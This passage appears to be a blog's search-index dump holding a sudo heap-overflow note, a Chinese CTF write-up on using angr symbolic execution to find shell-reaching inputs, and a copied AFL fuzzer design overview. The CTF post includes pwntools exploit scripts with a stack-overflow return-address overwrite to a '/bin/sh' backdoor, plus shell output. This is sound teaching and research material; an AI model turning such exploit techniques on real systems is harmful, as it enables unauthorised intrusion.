0x55791f9b40a00x55791f9b40a0:\t0x0000000000000000\t0x00000000000000210x55791f9b40b0:\t0x4141414141414141\t0x42424242414141410x55791f9b40c0:\t0x435f534c00424242\t0x73723d53524f4c4f0x55791f9b40d0:\t0x31303d69643a303d\t0x303d6e6c3a34333b0x55791f9b40e0:\t0x3d686d3a36333b31\t0x30343d69703a30300x55791f9b40f0:\t0x303d6f733a33333b\t0x3d6f643a35333b310x55791f9b4100:\t0x64623a35333b3130\t0x303b33333b30343d0x55791f9b4110:\t0x3b30343d64633a31\t0x726f3a31303b33330x55791f9b4120:\t0x303b31333b30343d\t0x3a30303d696d3a310x55791f9b4130:\t0x31343b37333d7573\t0x343b30333d67733a0x55791f9b4140:\t0x3b30333d61633a33\t0x30333d77743a3134\n\nIt is obviously, this is a heap overflow at top chunk, has overlaped the top chunk.\nHow can we get shell?\nUpdating…\nref: https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit\nref: https://github.com/blasty/CVE-2021-3156\nref: https://github.com/reverse-ex/CVE-2021-3156/blob/main/info\n","categories":["security"],"tags":["cve"]},{"title":"AUTO PWN","url":"/2021/03/31/security/ctf/pwn/auto-pwn/","content":"AUTO PWNref: https://angr.io/\nref:  https://bbs.pediy.com/thread-266757.htm\n介绍目前，CTF的PWN题越来越难以PWN掉，漏洞的挖掘和利用正逐步由人工向自动化。本文主要介绍自动化挖掘的一些实例，来学习自动化挖掘。\n然而，目前angr框架是个很不错的选择，angr是二进制分析的一个开源python框架。它采用符号执行技术，其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。\n开源地址: https://github.com/angr/angr\n涉及题目附件找i0gan要。\n安装angr为了方便不与pwntools库引起冲突，我们采用拉取docker镜像的方式进行使用，当然也可以直接 pip install angr也可以。\ndocker pull angr/angr\n\n\n\n在开始之前，我使用angr docker来运行scirpt，我编写了一个bash脚本来运行我们的angr脚本，如下所示，方便例1和例2使用。\n#! /bin/sh# Author: i0gan# for starting docker angrpwd=`pwd`if [[ $1 &lt; 2 ]];then    echo &quot;Usage angr script.py&quot;    exitfiscript=$1docker run -it -u angr --rm -v $pwd:/mnt -w /mnt angr/angr &quot;/home/angr/.virtualenvs/angr/bin/python&quot; &quot;/mnt/$script&quot; $2 $3\n\nUsage:\n./angr script.py\n\n\n\n\n\nExample 1来自2021红明谷杯总决赛\nchecksec:\nChecksec file: pwn1[*] &#x27;/run/media/i0gan/disk1/share/project/auto_pwn/pwn1&#x27;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n\n运行情况\n~/share/project/auto_pwn  ./pwn1                                                                                                 asdfinput your passwd:asdfasdfasdfinput your passwd:\n\n\n\n程序逻辑如下\nint sub_804870E()&#123;  int result; // eax  char v1[16]; // [esp+Ch] [ebp-1Ch] BYREF  int v2; // [esp+1Ch] [ebp-Ch]  result = inputn();  v2 = result;  switch ( result )  &#123;    case 1:      puts(&quot;logging out...&quot;);      result = ~dword_804A06C;      dword_804A06C = ~dword_804A06C;      break;    case 2:      if ( dword_804A06C )        result = shell(); // shell函数      else        result = puts(&quot;please log in&quot;);      break;    case 0:      puts(&quot;input your passwd:&quot;);      result = sub_804859B((int)v1, 16); // 输入密码      dword_804A06C = 1; // 正确之后，设置dword_804A06C为1，才可以获得shell      break;  &#125;  return result;&#125;\n\n上面，我们不知道密码是什么，我们也不管它是什么，我们只要能拿到shell就可以，那么如何让程序流跳到shell函数呢？angr可以方便的来实现。\n下面就是shell函数的地址，只要能使程序流执行到0x08048783，我们就可以拿到shell。\n.text:0804877A loc_804877A:                            ; CODE XREF: sub_804870E+19↑j.text:0804877A                 mov     eax, ds:dword_804A06C.text:0804877F                 test    eax, eax.text:08048781                 jz      short loc_804878A.text:08048783                 call    shell.text:08048788                 jmp     short loc_804879A\n\n好了，我们只要使程序流跑到我们的目标地址，再把输入数据给dump出来，dump出来的数据也就是我们的payload数据了。\nangr脚本pwn1_angr.py 如下 \nimport angrfrom binascii import b2a_heximport loggingimport sys#logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;INFO&#x27;)logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;CRITICAL&#x27;)def angr_main():    pj = angr.Project(&#x27;./pwn1&#x27;)    state = pj.factory.entry_state()    simgr = pj.factory.simgr(state)    simgr.explore(find = 0x08048783) # call shell    p = simgr.found[0].posix.dumps(0)    print(b2a_hex(p).decode(), end=&#x27;&#x27;)angr_main()\n\n运行:\n./angr pwn1_angr.py 310a320a\n\n这里我采用16进制方式打印出数据的，payload就是’\\x31\\x0a\\x32\\x0a’\n测试:\n./pwn11logging out...2sh-5.1$ whoamii0gan\n\n好了，现在我们得到了拿到shell的payload，那么我们怎么实现自动化去挖掘和pwn掉它呢？\n我们只需要让他先本地自动挖掘之后，让他自动打远程，如下。\npwn1_exp.py\nfrom pwn import *import osfrom binascii import a2b_hexio = process(&#x27;./pwn1&#x27;)print(&#x27;Solving...&#x27;)p = os.popen(&#x27;./angr pwn1_angr.py&#x27;).read()print(&#x27;Found payload: [&#x27; + p + &#x27;]&#x27;)p = a2b_hex(p)io.send(p)print(&#x27;Get shell&#x27;)io.sendline(&#x27;whoami&#x27;)io.interactive()\n\n运行pwn1_exp.py脚本\npython pwn1_exp.py[+] Starting local process &#x27;./pwn1&#x27;: pid 18152Solving...Found payload: [310a320a]Get shell[*] Switching to interactive modelogging out...i0gan\n\n通过以上实验，我们也可以自己来改进，我们是通过手动分析shell的函数在哪里，当然我们也可以让他自动找这个函数。\n这个例子比较简单的，但感觉比手动分析的没什么两样，下面我们来个有用的。\nExample 2来自第六届全国网络空间安全技术大赛\nida打开之后，对main函数进行F5，发现IDA报下面错误\nDecompilation failure:8048764: too big functionPlease refer to the manual to find appropriate actions\n\n采用汇编查看图报下面错误\nThe graph is too big (more than 1000 nodes) to be displayed on the screen.Switching to text mode.(you can change this limit in the graph options dialog)\n\n这是由于程序函数中的代码分支块太多，IDA没法生成图和伪代码来利于我们分析。\n我截一部分有用代码如下:\n.text:080487C6.text:080487C6 loc_80487C6:                            ; CODE XREF: main+51↑j.text:080487C6                 cmp     [ebp+var_C], 13h.text:080487CA                 jle     short loc_80487B7.text:080487CC                 lea     eax, [ebp+s2].text:080487CF                 mov     dword ptr [eax], 4A494355h.text:080487D5                 mov     dword ptr [eax+4], 49525545h.text:080487DC                 sub     esp, 0Ch.text:080487DF                 push    offset aEnterThePasswo_0 ; &quot;Enter the password: &quot;.text:080487E4                 call    _puts.text:080487E9                 add     esp, 10h.text:080487EC                 sub     esp, 8.text:080487EF                 lea     eax, [ebp+s1].text:080487F2                 push    eax.text:080487F3                 push    offset a8s      ; &quot;%8s&quot;.text:080487F8                 call    _scanf // 输入8个字符的数据.text:080487FD                 add     esp, 10h.text:08048800                 mov     [ebp+var_10], 0.text:08048807                 jmp     short loc_8048836\n\n输入8个字符之后，就跳到了函数代码分支块中不断的跳来跳去的。\n.text:08048836 loc_8048836:                            ; CODE XREF: main+A3↑j.text:08048836                 cmp     [ebp+var_10], 7.text:0804883A                 jle     short loc_8048809.text:0804883C                 lea     eax, [ebp+s1].text:0804883F                 add     eax, 1.text:08048842                 movzx   eax, byte ptr [eax].text:08048845                 movzx   eax, al.text:08048848                 and     eax, 10h.text:0804884B                 test    eax, eax.text:0804884D                 setnz   dl.text:08048850                 lea     eax, [ebp+s2].text:08048853                 add     eax, 1.text:08048856                 movzx   eax, byte ptr [eax].text:08048859                 movzx   eax, al.text:0804885C                 and     eax, 10h.text:0804885F                 test    eax, eax.text:08048861                 setnz   al.text:08048864                 xor     eax, edx.text:08048866                 test    al, al.text:08048868                 jz      loc_808E7DC.text:0804886E                 call    aaz.text:08048873                 lea     eax, [ebp+s1]....\n\n然而发现有个函数有堆栈溢出\nint login_again()&#123;  char s1[72]; // [esp+0h] [ebp-48h] BYREF  setbuf(stdout, 0);  setbuf(stderr, 0);  setbuf(stdin, 0);  puts(&quot;Enter the password again: &quot;);  scanf(&quot;%s&quot;, s1);  if ( !strcmp(s1, &quot;deadbeef&quot;) )    puts(&quot;I think you can&#x27;t get shell&quot;);  else    puts(&quot;Error.&quot;);  return 0;&#125;\n\n且有后门函数\nint get_sh()&#123;  return system(&quot;/bin/sh&quot;);&#125;\n\n若我们输入某些数据，能够使程序流执行到该函数，那么我们就可以利用该漏洞来获得shell，当然我们也可以直接使程序流跳到get_sh函数，但分支块中是没有用到get_sh函数的，而login_again在 ass函数中进行调用的。\nint __cdecl aas(const char *s1, const char *s2)&#123;  int result; // eax  if ( should_succeed &amp;&amp; !strncmp(s1, s2, 8u) )    result = login_again();                     // vul  else    result = puts(&quot;Error.&quot;);  return result;&#125;\n\nass函数也是在代码分支块中进行调用，所以这类似于fuzz，fuzz有关系的路径比没关系的要容易得多，我们就使程序流到达login_again之后，再利用堆栈溢出漏洞调用后门函数即可。\n与例1差不多，只需要让angr引擎找到一个输入的数据满足程序流到达login_again函数即可。\n编写angr脚本如下:\nauto_angr.py\nimport angrfrom binascii import b2a_heximport loggingimport syslogging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;INFO&#x27;)#logging.getLogger(&#x27;angr&#x27;).setLevel(&#x27;CRITICAL&#x27;)def angr_main():    pj = angr.Project(&#x27;./auto&#x27;)    state = pj.factory.entry_state()    simgr = pj.factory.simgr(state)    simgr.explore(find = 0x0804867E) # call login_again    p = simgr.found[0].posix.dumps(0)    print(b2a_hex(p).decode(), end=&#x27;&#x27;)angr_main()\n\n这里还是借助之前我们写的一个angr脚本。\n运行如下: \n./angr auto_angr.py 555859554b564e5a\n\n那么我们得到的payload就是’\\x55\\x58\\x59\\x55\\x4b\\x56\\x4e\\x5a’，这个输入能够使我们的程序流执行到login_again函数，之后呢我们就采用简单的堆栈溢出达到获得shell了。\n#!/usr/bin/env python#-*- coding:utf-8 -*-#Author: i0ganfrom pwn import *context.log_level = &#x27;debug&#x27;#io = remote(&#x27;81.70.195.166&#x27;, 10001)io = process(&#x27;./auto&#x27;)payload = &#x27;\\x55\\x58\\x59\\x55\\x4b\\x56\\x4e\\x5a&#x27;io.send(payload)payload = b&#x27;\\x00&#x27; * 0x48 +  p32(0x0) + p32(0x08048665) # 修改返回地址到get_sh函数io.sendline(payload)io.interactive()\n\n运行如下\n[+] Starting local process &#x27;./auto&#x27; argv=[b&#x27;./auto&#x27;] : pid 6957[DEBUG] Sent 0x8 bytes:    b&#x27;UXYUKVNZ&#x27;[DEBUG] Sent 0x51 bytes:    00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│    *    00000040  00 00 00 00  00 00 00 00  00 00 00 00  65 86 04 08  │····│····│····│e···│    00000050  0a                                                  │·│    00000051[*] Switching to interactive mode[DEBUG] Received 0x37 bytes:    b&#x27;Enter the password: \\n&#x27;    b&#x27;Enter the password again: \\n&#x27;    b&#x27;Error.\\n&#x27;Enter the password: Enter the password again: Error.$ whoami[DEBUG] Sent 0x7 bytes:    b&#x27;whoami\\n&#x27;[DEBUG] Received 0x6 bytes:    b&#x27;i0gan\\n&#x27;i0gan\n\n\n\n\n\n总结通过以上两个例子，我们没有去分析输入之后程序是怎么处理该数据的，我们只关心结果，面对例子2，手动分析和调试起来极其困难，程序太大了，人工分析起来很困难，这时候，借助AUTO PWN的手段，很方便我们能够找的payload，我这个惨杂了手工分析的一些参数，这只是方便于理解，当然也可以开发出自己的一套自动化系统，自动去识别程序逻辑，完成自动构建payload，这也是今后需要不断提升和研究的。目前很多pwn也需要该手段，比如xctf中start ctf babypac可以采用angr引擎很方便的找到触发漏洞的payload，那个是个aarch架构的pwn，angr引擎是跨架构的，不影响angr来实现符号执行分析，还有vm pwn这些，若懒得分析程序逻辑，只想快速找到每个opcode对应什么分支块，采用该技术也是Perfect!。\n","categories":["ctf"],"tags":["pwn"]},{"title":"Binary fuzzing way of american fuzzy lop","url":"/2021/03/31/security/fuzz/fuzz-afl/","content":"Binary fuzzing way of american fuzzy lopIntroThe github project is here: https://github.com/google/AFL\nThis paper refer to the official document: https://afl-1.readthedocs.io/\nWhat is AFL?American fuzzy lop is a security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. This substantially improves the functional coverage for the fuzzed code. The compact synthesized corpora produced by the tool are also useful for seeding other, more labor- or resource-intensive testing regimes down the road.\nHow to install envMethod 1sudo pacman -S afl-utilssudo pacman -S afl\n\nInput afl and press Tab Tab output as follows:\nsh: afl-afl-analyze       afl-clang-fast++  afl-fuzz          afl-minimize      afl-showmap       afl-vcrash      afl-clang         afl-cmin          afl-g++           afl-multicore     afl-stats         afl-whatsup     afl-clang++       afl-collect       afl-gcc           afl-multikill     afl-sync                          afl-clang-fast    afl-cron          afl-gotcpu        afl-plot          afl-tmin \n\nSo you can use these tools to start fuzzing.\nMethod 2git clone https://github.com/google/AFL.gitcd afl-mastermake -jsudo make install\n\n\n\nHow it works?Copy from official doc: click here to show all details.\n0x00 TechnicalTechnical “whitepaper” for afl-fuzz.\n0x01 Coverage measurementsThe instrumentation injected into complied programs captures branch (edge) coverage, along with coarse branch-taken (采取粗分枝) hit counts. The code injected at branch points is essentially equivalent to\ncur_location = &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++;prev_location = cur_location &gt;&gt; 1;\n\nThe cur_location value is generated randomly to simplify the process of linking complex projects and keep the XOR output distributed uniformly.\nThe shared_mem[] array is a 64 KB SHM region passed to the instrumented binary by the caller. Every byte set in the output map can be thought of as a hit for a particular (branch_src, branch_dst) tuple in the instrumented code.\nThe size of the map is chosen so that collisions are sporadic with almost all of the intended targets, which usually sport between 2k and 10k discoverable branch points:\n\n\n\n\nBranch cnt\nColliding tuples\nExample targets\n\n\n\n1,000\n0.75%\ngiflib, lzo\n\n\n2,000\n1.5%\nzlib, tar, xz\n\n\n5,000\n3.5%\nlibpng, libwebp\n\n\n10,000\n7%\nlibxml\n\n\n20,000\n14%\nsqlite\n\n\n50,000\n30%\n\n\n\n\nAt the same time, its size is small enough to allow the map to be analyzed in a matter of microseconds on the receiving end, and to effortlessly fit within L2 cache.\nThis form of coverage provides considerably more insight into the execution path of the program than simple block coverage. In particular, it trivially distinguishes between the following execution traces:\nA -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)\n\nThis aids the discovery of subtle fault conditions in the underlying code, because security vulnerabilities are more often associated with unexpected or incorrect state transitions than with merely reaching a new basic block.\nThe reason for the shift operation in the last line of the pseudocode shown earlier in this section is to preserve the directionality of tuples (without this, A ^ B would be indistinguishable from B ^ A) and to retain the identity of tight loops (otherwise, A ^ A would be obviously equal to B ^ B).\nThe absence of simple saturating arithmetic opcodes on Intel CPUs means that the hit counters can sometimes wrap around to zero. Since this is a fairly unlikely and localized event, it’s seen as an acceptable performance trade-off.\n0x02 Detecting new behaviorsThe fuzzer maintains a global map of tuples seen in previous executions; this data can be rapidly compared with individual traces and updated in just a couple of dword- or qword-wide instructions and a simple loop.\nWhen a mutated input produces an execution trace containing new tuples, the corresponding input file is preserved and routed for additional processing later on (see section #3). Inputs that do not trigger new local-scale state transitions in the execution trace (i.e., produce no new tuples) are discarded, even if their overall control flow sequence is unique.\nThis approach allows for a very fine-grained and long-term exploration of program state while not having to perform any computationally intensive and fragile global comparisons of complex execution traces, and while avoiding the scourge of path explosion.\nTo illustrate the properties of the algorithm, consider that the second trace shown below would be considered substantially new because of the presence of new tuples (CA, AE):\n#1: A -&gt; B -&gt; C -&gt; D -&gt; E#2: A -&gt; B -&gt; C -&gt; A -&gt; E\n\nAt the same time, with #2 processed, the following pattern will not be seen as unique, despite having a markedly different overall execution path:\n#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E\n\nIn addition to detecting new tuples, the fuzzer also considers coarse tuple hit counts. These are divided into several buckets:\n1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+\n\nTo some extent, the number of buckets is an implementation artifact: it allows an in-place mapping of an 8-bit counter generated by the instrumentation to an 8-position bitmap relied on by the fuzzer executable to keep track of the already-seen execution counts for each tuple.\nChanges within the range of a single bucket are ignored; transition from one bucket to another is flagged as an interesting change in program control flow, and is routed to the evolutionary process outlined in the section below.\nThe hit count behavior provides a way to distinguish between potentially interesting control flow changes, such as a block of code being executed twice when it was normally hit only once. At the same time, it is fairly insensitive to empirically less notable changes, such as a loop going from 47 cycles to 48. The counters also provide some degree of “accidental” immunity against tuple collisions in dense trace maps.\nThe execution is policed fairly heavily through memory and execution time limits; by default, the timeout is set at 5x the initially-calibrated execution speed, rounded up to 20 ms. The aggressive timeouts are meant to prevent dramatic fuzzer performance degradation by descending into tarpits that, say, improve coverage by 1% while being 100x slower; we pragmatically reject them and hope that the fuzzer will find a less expensive way to reach the same code. Empirical testing strongly suggests that more generous time limits are not worth the cost.\n0x03 Evolving the input queueMutated test cases that produced new state transitions within the program are added to the input queue and used as a starting point for future rounds of fuzzing. They supplement, but do not automatically replace, existing finds.\nIn contrast to more greedy genetic algorithms, this approach allows the tool to progressively explore various disjoint and possibly mutually incompatible features of the underlying data format, as shown in this image:\n\nhttp://lcamtuf.coredump.cx/afl/afl_gzip.png\n\nSeveral practical examples of the results of this algorithm are discussed here:\n\nhttp://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html http://lcamtuf.blogspot.com/2014/11/afl-fuzz-nobody-expects-cdata-sections.html\n\nThe synthetic corpus produced by this process is essentially a compact collection of “hmm, this does something new!” input files, and can be used to seed any other testing processes down the line (for example, to manually stress-test resource-intensive desktop apps).\nWith this approach, the queue for most targets grows to somewhere between 1k and 10k entries; approximately 10-30% of this is attributable to the discovery of new tuples, and the remainder is associated with changes in hit counts.\nThe following table compares the relative ability to discover file syntax and explore program states when using several different approaches to guided fuzzing. The instrumented target was GNU patch 2.7.3 compiled with -O3 and seeded with a dummy text file; the session consisted of a single pass over the input queue with afl-fuzz:\n\n\n\n\nFuzzer guidance strategy used\nBlocks reached\nEdges reached\nEdge hit cnt var\nHighest-coverage test case generated\n\n\n\n(Initial file)\n156\n163\n1.00\n(none)\n\n\nBlind fuzzing S\n182\n205\n2.23\nFirst 2 B of RCS diff\n\n\nBlind fuzzing L\n228\n265\n2.23\nFirst 4 B of -c mode diff\n\n\nBlock coverage\n855\n1,130\n1.57\nAlmost-valid RCS diff\n\n\nEdge coverage\n1,452\n2,070\n2.18\nOne-chunk -c mode diff\n\n\nAFL model\n1,765\n2,597\n4.99\nFour-chunk -c mode diff\n\n\n\nThe first entry for blind fuzzing (“S”) corresponds to executing just a single round of testing; the second set of figures (“L”) shows the fuzzer running in a loop for a number of execution cycles comparable with that of the instrumented runs, which required more time to fully process the growing queue.\nRoughly similar results have been obtained in a separate experiment where the fuzzer was modified to compile out all the random fuzzing stages and leave just a series of rudimentary, sequential operations such as walking bit flips. Because this mode would be incapable of altering the size of the input file, the sessions were seeded with a valid unified diff:\n\n\n\n\nQueue extension strategy used\nBlocks reached\nEdges reached\nEdge hit cnt var\nNumber of unique crashes found\n\n\n\n(Initial file)\n624\n717\n1.00\n\n\n\nBlind fuzzing\n1,101\n1,409\n1.60\n0\n\n\nBlock coverage\n1,255\n1,649\n1.48\n0\n\n\nEdge coverage\n1,259\n1,734\n1.72\n0\n\n\nAFL model\n1,452\n2,040\n3.16\n1\n\n\n\nAt noted earlier on, some of the prior work on genetic fuzzing relied on maintaining a single test case and evolving it to maximize coverage. At least in the tests described above, this “greedy” approach appears to confer no substantial benefits over blind fuzzing strategies.\n0x04 Culling the corpusThe progressive state exploration approach outlined above means that some of the test cases synthesized later on in the game may have edge coverage that is a strict superset of the coverage provided by their ancestors.\nTo optimize the fuzzing effort, AFL periodically re-evaluates the queue using a fast algorithm that selects a smaller subset of test cases that still cover every tuple seen so far, and whose characteristics make them particularly favorable to the tool.\nThe algorithm works by assigning every queue entry a score proportional to its execution latency and file size; and then selecting lowest-scoring candidates for each tuple.\nThe tuples are then processed sequentially using a simple workflow:\n\n\nFind next tuple not yet in the temporary working set,\nLocate the winning queue entry for this tuple,\nRegister all tuples present in that entry’s trace in the working set,\nGo to #1 if there are any missing tuples in the set.\n\n\nThe generated corpus of “favored” entries is usually 5-10x smaller than the starting data set. Non-favored entries are not discarded, but they are skipped with varying probabilities when encountered in the queue:\n\n\nIf there are new, yet-to-be-fuzzed favorites present in the queue, 99% of non-favored entries will be skipped to get to the favored ones.\nIf there are no new favorites:\nIf the current non-favored entry was fuzzed before, it will be skipped 95% of the time.\nIf it hasn’t gone through any fuzzing rounds yet, the odds of skipping drop down to 75%.\n\n\n\n\nBased on empirical testing, this provides a reasonable balance between queue cycling speed and test case diversity.\nSlightly more sophisticated but much slower culling can be performed on input or output corpora with afl-cmin. This tool permanently discards the redundant entries and produces a smaller corpus suitable for use with afl-fuzz or external tools.\n0x05 Trimming input filesFile size has a dramatic impact on fuzzing performance, both because large files make the target binary slower, and because they reduce the likelihood that a mutation would touch important format control structures, rather than redundant data blocks. This is discussed in more detail in Performance Tips.\nThe possibility that the user will provide a low-quality starting corpus aside, some types of mutations can have the effect of iteratively increasing the size of the generated files, so it is important to counter this trend.\nLuckily, the instrumentation feedback provides a simple way to automatically trim down input files while ensuring that the changes made to the files have no impact on the execution path.\nThe built-in trimmer in afl-fuzz attempts to sequentially remove blocks of data with variable length and stepover; any deletion that doesn’t affect the checksum of the trace map is committed to disk. The trimmer is not designed to be particularly thorough; instead, it tries to strike a balance between precision and the number of execve() calls spent on the process, selecting the block size and stepover to match. The average per-file gains are around 5-20%.\nThe standalone afl-tmin tool uses a more exhaustive, iterative algorithm, and also attempts to perform alphabet normalization on the trimmed files. The operation of afl-tmin is as follows.\nFirst, the tool automatically selects the operating mode. If the initial input crashes the target binary, afl-tmin will run in non-instrumented mode, simply keeping any tweaks that produce a simpler file but still crash the target. If the target is non-crashing, the tool uses an instrumented mode and keeps only the tweaks that produce exactly the same execution path.\nThe actual minimization algorithm is:\n\n\nAttempt to zero large blocks of data with large stepovers. Empirically, this is shown to reduce the number of execs by preempting finer-grained efforts later on.\nPerform a block deletion pass with decreasing block sizes and stepovers, binary-search-style.\nPerform alphabet normalization by counting unique characters and trying to bulk-replace each with a zero value.\nAs a last result, perform byte-by-byte normalization on non-zero bytes.\n\n\nInstead of zeroing with a 0x00 byte, afl-tmin uses the ASCII digit ‘0’. This is done because such a modification is much less likely to interfere with text parsing, so it is more likely to result in successful minimization of text files.\nThe algorithm used here is less involved than some other test case minimization approaches proposed in academic work, but requires far fewer executions and tends to produce comparable results in most real-world applications.\n0x06 Fuzzing strategiesThe feedback provided by the instrumentation makes it easy to understand the value of various fuzzing strategies and optimize their parameters so that they work equally well across a wide range of file types. The strategies used by afl-fuzz are generally format-agnostic and are discussed in more detail here:\n\nhttp://lcamtuf.blogspot.com/2014/08/binary-fuzzing-strategies-what-works.html\n\nIt is somewhat notable that especially early on, most of the work done by afl-fuzz is actually highly deterministic, and progresses to random stacked modifications and test case splicing only at a later stage. The deterministic strategies include:\n\n\nSequential bit flips with varying lengths and stepovers,\nSequential addition and subtraction of small integers,\nSequential insertion of known interesting integers (0, 1, INT_MAX, etc),\n\n\nThe purpose of opening with deterministic steps is related to their tendency to produce compact test cases and small diffs between the non-crashing and crashing inputs.\nWith deterministic fuzzing out of the way, the non-deterministic steps include stacked bit flips, insertions, deletions, arithmetics, and splicing of different test cases.\nThe relative yields and execve() costs of all these strategies have been investigated and are discussed in the aforementioned blog post.\nFor the reasons discussed in History (chiefly, performance, simplicity, and reliability), AFL generally does not try to reason about the relationship between specific mutations and program states; the fuzzing steps are nominally blind, and are guided only by the evolutionary design of the input queue.\nThat said, there is one (trivial) exception to this rule: when a new queue entry goes through the initial set of deterministic fuzzing steps, and tweaks to some regions in the file are observed to have no effect on the checksum of the execution path, they may be excluded from the remaining phases of deterministic fuzzing - and the fuzzer may proceed straight to random tweaks. Especially for verbose, human-readable data formats, this can reduce the number of execs by 10-40% or so without an appreciable drop in coverage. In extreme cases, such as normally block-aligned tar archives, the gains can be as high as 90%.\nBecause the underlying “effector maps” are local every queue entry and remain in force only during deterministic stages that do not alter the size or the general layout of the underlying file, this mechanism appears to work very reliably and proved to be simple to implement.\n0x07 DictionariesThe feedback provided by the instrumentation makes it easy to automatically identify syntax tokens in some types of input files, and to detect that certain combinations of predefined or auto-detected dictionary terms constitute a valid grammar for the tested parser.\nA discussion of how these features are implemented within afl-fuzz can be found here:\n\nhttp://lcamtuf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.html\n\nIn essence, when basic, typically easily-obtained syntax tokens are combined together in a purely random manner, the instrumentation and the evolutionary design of the queue together provide a feedback mechanism to differentiate between meaningless mutations and ones that trigger new behaviors in the instrumented code - and to incrementally build more complex syntax on top of this discovery.\nThe dictionaries have been shown to enable the fuzzer to rapidly reconstruct the grammar of highly verbose and complex languages such as JavaScript, SQL, or XML; several examples of generated SQL statements are given in the blog post mentioned above.\nInterestingly, the AFL instrumentation also allows the fuzzer to automatically isolate syntax tokens already present in an input file. It can do so by looking for run of bytes that, when flipped, produce a consistent change to the program’s execution path; this is suggestive of an underlying atomic comparison to a predefined value baked into the code. The fuzzer relies on this signal to build compact “auto dictionaries” that are then used in conjunction with other fuzzing strategies.\n0x08 De-duping crashesDe-duplication of crashes is one of the more important problems for any competent fuzzing tool. Many of the naive approaches run into problems; in particular, looking just at the faulting address may lead to completely unrelated issues being clustered together if the fault happens in a common library function (say, strcmp, strcpy); while checksumming call stack backtraces can lead to extreme crash count inflation if the fault can be reached through a number of different, possibly recursive code paths.\nThe solution implemented in afl-fuzz considers a crash unique if any of two conditions are met:\n\n\nThe crash trace includes a tuple not seen in any of the previous crashes,\nThe crash trace is missing a tuple that was always present in earlier faults.\n\n\nThe approach is vulnerable to some path count inflation early on, but exhibits a very strong self-limiting effect, similar to the execution path analysis logic that is the cornerstone of afl-fuzz.\nInvestigating crashesThe exploitability of many types of crashes can be ambiguous; afl-fuzz tries to address this by providing a crash exploration mode where a known-faulting test case is fuzzed in a manner very similar to the normal operation of the fuzzer, but with a constraint that causes any non-crashing mutations to be thrown away.\nA detailed discussion of the value of this approach can be found here:\n\nhttp://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html\n\nThe method uses instrumentation feedback to explore the state of the crashing program to get past the ambiguous faulting condition and then isolate the newly-found inputs for human review.\nOn the subject of crashes, it is worth noting that in contrast to normal queue entries, crashing inputs are not trimmed; they are kept exactly as discovered to make it easier to compare them to the parent, non-crashing entry in the queue. That said, afl-tmin can be used to shrink them at will.\n0x09 The fork serverTo improve performance, afl-fuzz uses a “fork server”, where the fuzzed process goes through execve(), linking, and libc initialization only once, and is then cloned from a stopped process image by leveraging copy-on-write. The implementation is described in more detail here:\n\nhttp://lcamtuf.blogspot.com/2014/10/fuzzing-binaries-without-execve.html\n\nThe fork server is an integral aspect of the injected instrumentation and simply stops at the first instrumented function to await commands from afl-fuzz.\nWith fast targets, the fork server can offer considerable performance gains, usually between 1.5x and 2x. It is also possible to:\n\n\nUse the fork server in manual (“deferred”) mode, skipping over larger, user-selected chunks of initialization code. It requires very modest code changes to the targeted program, and With some targets, can produce 10x+ performance gains.\nEnable “persistent” mode, where a single process is used to try out multiple inputs, greatly limiting the overhead of repetitive fork() calls. This generally requires some code changes to the targeted program, but can improve the performance of fast targets by a factor of 5 or more - approximating the benefits of in-process fuzzing jobs while still maintaining very robust isolation between the fuzzer process and the targeted binary.\n\n\n0x0A ParallelizationThe parallelization mechanism relies on periodically examining the queues produced by independently-running instances on other CPU cores or on remote machines, and then selectively pulling in the test cases that, when tried out locally, produce behaviors not yet seen by the fuzzer at hand.\nThis allows for extreme flexibility in fuzzer setup, including running synced instances against different parsers of a common data format, often with synergistic effects.\nFor more information about this design, see Tips for parallel fuzzing.\n0x0B Binary-only instrumentationInstrumentation of black-box, binary-only targets is accomplished with the help of a separately-built version of QEMU in “user emulation” mode. This also allows the execution of cross-architecture code - say, ARM binaries on x86.\nQEMU uses basic blocks as translation units; the instrumentation is implemented on top of this and uses a model roughly analogous to the compile-time hooks:\nif (block_address &gt; elf_text_start &amp;&amp; block_address &lt; elf_text_end) &#123;  cur_location = (block_address &gt;&gt; 4) ^ (block_address &lt;&lt; 8);  shared_mem[cur_location ^ prev_location]++;  prev_location = cur_location &gt;&gt; 1;&#125;\n\nThe shift-and-XOR-based scrambling in the second line is used to mask the effects of instruction alignment.\nThe start-up of binary translators such as QEMU, DynamoRIO, and PIN is fairly slow; to counter this, the QEMU mode leverages a fork server similar to that used for compiler-instrumented code, effectively spawning copies of an already-initialized process paused at _start.\nFirst-time translation of a new basic block also incurs substantial latency. To eliminate this problem, the AFL fork server is extended by providing a channel between the running emulator and the parent process. The channel is used to notify the parent about the addresses of any newly-encountered blocks and to add them to the translation cache that will be replicated for future child processes.\nAs a result of these two optimizations, the overhead of the QEMU mode is roughly 2-5x, compared to 100x+ for PIN.\n0x0C OthersThe afl-analyze toolThe file format analyzer is a simple extension of the minimization algorithm discussed earlier on; instead of attempting to remove no-op blocks, the tool performs a series of walking byte flips and then annotates runs of bytes in the input file.\nIt uses the following classification scheme:\n\n\n“No-op blocks” - segments where bit flips cause no apparent changes to control flow. Common examples may be comment sections, pixel data within a bitmap file, 